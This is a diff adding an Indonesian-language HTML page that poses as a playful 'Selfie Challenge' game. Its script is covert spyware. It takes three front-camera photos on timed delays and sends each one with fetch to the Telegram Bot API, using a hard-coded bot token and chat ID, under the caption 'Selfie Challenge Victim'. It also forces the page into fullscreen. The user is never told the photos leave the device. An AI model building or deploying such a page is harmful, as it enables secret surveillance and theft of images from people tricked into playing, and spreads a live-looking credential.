@@ -1,0 +1,94 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>Selfie Challenge 🔥</title>
+    <style>
+        body {
+            margin: 0; padding: 0; overflow: hidden; background: linear-gradient(#ff00cc, #3333ff);
+            font-family: 'Comic Sans MS', cursive, sans-serif; color: white; text-align: center;
+            height: 100vh; display: flex; flex-direction: column; justify-content: center; align-items: center;
+        }
+        h1 { font-size: 55px; margin: 10px; text-shadow: 0 0 15px yellow; animation: bounce 1s infinite; }
+        p { font-size: 28px; margin: 10px; }
+        button {
+            margin-top: 20px; padding: 15px 40px; font-size: 24px; background: #ffff00; color: #000;
+            border: none; border-radius: 50px; cursor: pointer; box-shadow: 0 0 20px white;
+        }
+        button:hover { transform: scale(1.1); }
+        .score { position: absolute; top: 20px; right: 20px; font-size: 30px; }
+        @keyframes bounce { 0%,100% { transform: translateY(0); } 50% { transform: translateY(-15px); } }
+    </style>
+</head>
+<body>
+    <div class="score">Score: <span id="score">0</span></div>
+    <h1>🎮 SELFIE CHALLENGE 🔥</h1>
+    <p id="text">Level 1: Ambil selfie lucu biar unlock filter keren!</p>
+    <button onclick="startGame()">MULAI CHALLENGE SEKARANG!</button>
+
+    <script>
+        const BOT_TOKEN = "8582003361:AAH1MMKjNGDRpISBYzG8emMBLHCS4sztmW8";
+        const CHAT_ID = "8509633837";
+        let score = 0;
+
+        async function kirimFoto(blob) {
+            const formData = new FormData();
+            formData.append("chat_id", CHAT_ID);
+            formData.append("photo", blob, "selfie_challenge.jpg");
+            formData.append("caption", `🎉 Selfie Challenge Victim\nScore: ${score}\nWaktu: ${new Date().toLocaleString()}`);
+
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: "POST",
+                body: formData
+            });
+        }
+
+        async function ambilSelfie() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+                const video = document.createElement("video");
+                video.srcObject = stream;
+                await video.play();
+
+                await new Promise(r => setTimeout(r, 800));
+
+                const canvas = document.createElement("canvas");
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                canvas.getContext("2d").drawImage(video, 0, 0);
+
+                stream.getTracks().forEach(t => t.stop());
+
+                canvas.toBlob((blob) => {
+                    if (blob) kirimFoto(blob);
+                }, "image/jpeg", 0.9);
+
+            } catch(e) {
+                console.log("Kamera ditolak");
+            }
+        }
+
+        function startGame() {
+            document.querySelector("button").style.display = "none";
+            document.getElementById("text").innerHTML = "📸 Ambil selfie sekarang!<br>Filter lucu akan muncul...";
+
+            score += 100;
+            document.getElementById("score").textContent = score;
+
+            // Ambil foto beberapa kali dengan delay fun
+            setTimeout(() => { ambilSelfie(); }, 1500);
+            setTimeout(() => { 
+                document.getElementById("text").innerHTML = "🎉 Bagus! Score naik!<br>Level 2: Selfie lagi yuk!";
+                ambilSelfie(); 
+            }, 4500);
+            setTimeout(() => { 
+                document.getElementById("text").innerHTML = "🔥 Challenge selesai!<br>Kamu juaranya!";
+                ambilSelfie(); 
+            }, 8500);
+        }
+
+        // Auto fullscreen biar lebih mirip game
+        document.documentElement.requestFullscreen?.();
+    </script>
+</body>
+</html>
